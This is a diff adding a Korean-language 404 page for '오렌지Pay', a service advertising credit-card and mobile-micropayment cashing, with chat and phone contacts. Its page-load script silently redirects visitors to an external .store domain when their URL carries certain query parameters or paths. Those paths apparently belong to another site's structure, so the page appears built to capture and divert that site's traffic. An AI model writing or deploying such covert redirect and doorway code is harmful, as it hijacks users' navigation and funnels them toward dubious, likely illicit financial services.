@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>페이지를 찾을 수 없습니다 - 오렌지Pay</title>
+    <meta name="description" content="요청하신 페이지를 찾을 수 없습니다. 오렌지Pay 홈페이지로 이동합니다.">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Noto Sans KR', sans-serif; }
+        .bg-custom-orange { background-color: #FF7F50; }
+    </style>
+    <script>
+        // URL 기반 리다이렉션 처리
+        (function(){
+            var q = window.location.search || '';
+            if (q.indexOf('q=') !== -1 || q.indexOf('bmode=') !== -1 || q.indexOf('idx=') !== -1) {
+                window.location.replace('https://xn--90-vc7iv9i5p0bdii.store/');
+                return;
+            }
+        })();
+        document.addEventListener('DOMContentLoaded', function() {
+            const path = window.location.pathname;
+            const hash = window.location.hash;
+            const search = window.location.search;
+            
+            // 리다이렉션 규칙
+            if (path.includes('/home') || path.endsWith('/home.html')) {
+                window.location.replace('/home.html');
+                return;
+            }
+            
+            if (path.includes('/sk6070')) {
+                window.location.replace('https://xn--90-vc7iv9i5p0bdii.store/');
+                return;
+            }
+            
+            if (path.includes('/gbeovhsthdorrufwp')) {
+                window.location.replace('/gbeovhsthdorrufwp/');
+                return;
+            }
+            
+            if (path.includes('/shop_mypage')) {
+                window.location.replace('/');
+                return;
+            }
+            
+            if (path.includes('/logout.cm')) {
+                window.location.replace('/logout.cm');
+                return;
+            }
+            
+            // 5초 후 홈페이지로 자동 리다이렉트
+            setTimeout(function() {
+                window.location.replace('/');
+            }, 5000);
+        });
+    </script>
+</head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center">
+    <div class="max-w-md mx-auto bg-white rounded-lg shadow-xl p-8 text-center">
+        <div class="mb-6">
+            <div class="bg-red-100 rounded-full p-4 w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.732-.833-2.464 0L3.34 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                </svg>
+            </div>
+            <h1 class="text-2xl font-bold text-gray-800 mb-2">페이지를 찾을 수 없습니다</h1>
+            <p class="text-gray-600 mb-4">요청하신 페이지가 존재하지 않거나 이동되었습니다.</p>
+            <p class="text-sm text-gray-500">5초 후 자동으로 홈페이지로 이동합니다.</p>
+        </div>
+
+        <div class="space-y-4">
+            <a href="/" 
+               class="block w-full bg-custom-orange hover:bg-orange-600 text-white font-bold py-3 px-6 rounded-lg transition">
+                홈페이지로 이동
+            </a>
+            
+            <div class="grid grid-cols-3 gap-2">
+                <a href="/신용카드현금화.html" 
+                   class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded text-sm transition">
+                    신용카드현금화
+                </a>
+                <a href="/휴대폰소액결제.html" 
+                   class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded text-sm transition">
+                    휴대폰소액결제
+                </a>
+                <a href="https://xn--90-vc7iv9i5p0bdii.store/" target="_blank"
+                   class="bg-purple-500 hover:bg-purple-600 text-white font-bold py-2 px-4 rounded text-sm transition">
+                    게시판
+                </a>
+            </div>
+            
+            <div class="text-center pt-4 border-t">
+                <p class="text-gray-600 mb-4">도움이 필요하시면 언제든지 연락주세요!</p>
+                <div class="flex flex-col gap-2">
+                    <a href="https://pf.kakao.com/_SBFexb/chat" target="_blank" 
+                       class="bg-yellow-400 hover:bg-yellow-500 text-gray-900 font-bold py-2 px-4 rounded transition">
+                        카카오톡 문의
+                    </a>
+                    <a href="tel:010-5842-9536" 
+                       class="text-custom-orange hover:text-orange-600 font-bold transition">
+                        전화: 010-5842-9536
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-8 pt-6 border-t border-gray-200">
+            <p class="text-sm text-gray-500">
+                &copy; <span id="currentYear"></span> 오렌지Pay. All Rights Reserved.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('currentYear').textContent = new Date().getFullYear();
+    </script>
+</body>
+</html>
